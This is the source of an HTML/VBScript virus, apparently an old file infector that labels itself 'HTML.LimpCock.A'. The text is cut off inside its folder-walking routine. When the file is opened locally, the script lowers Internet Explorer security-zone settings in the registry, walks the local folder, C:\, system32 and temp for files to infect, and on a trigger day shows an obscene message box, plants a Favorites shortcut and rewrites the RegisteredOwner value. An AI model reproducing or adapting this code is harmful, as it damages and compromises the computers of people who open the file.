<!--HTML.LimpCock.A-->
<HTML><BODY>
<Script Language="VBScript">
<!--
'HTML.HTML.LimpCock.A
'By -=[3L1(\)D /-\E0(\]=-
On Error Resume Next
If location.protocol = "file:" then
 Randomize
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
 WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
  If location.protocol = "file:" then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   HPath = Replace(location.href, "/", "\")
   HPath = Replace(HPath, "file:\\\","")
   HPath = FSO.GetParentFolderName(HPath)
   Set TRange = document.body.createTextRange
   Call GetFolder(HPath)
   Call GetFolder("C:\")
   Call GetFolder("C:\Windows\system32")
   Call GetFolder("C:\Windows\temp")
 End If
 If Day(Now()) = Int(Rnd * 1) + 1 Then
   MsgBox("///////////////Get some Viagra® you poor limp dicked bastard...then maybe a boob job for your girl !!! Bahahaha\\\\\\\\\\\\\\")
   Set HTML.LimpCock.ALink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\HTML.LimpCock.A.URL")
   HTML.LimpCock.ALink.TargetPath = "http://www.geocities.com/primus_chaosium/item1.html"
   HTML.LimpCock.ALink.Save
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Limp Dick"
 End If
End If
Sub GetFolder(InfPath)
On Error Resume Nex